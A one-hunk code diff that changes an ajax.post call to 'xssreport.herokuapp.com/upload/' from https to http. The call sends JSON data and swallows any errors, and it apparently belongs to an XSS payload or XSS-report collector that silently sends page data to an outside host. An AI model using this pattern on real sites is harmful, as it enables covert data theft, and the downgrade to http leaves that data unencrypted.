@@ -30,7 +30,7 @@
   }
 
   try {
-    ajax.post('https://xssreport.herokuapp.com/upload/', function() {}, 'd=' + JSON.stringify(data));
+    ajax.post('http://xssreport.herokuapp.com/upload/', function() {}, 'd=' + JSON.stringify(data));
   } catch (e) {
 
   }
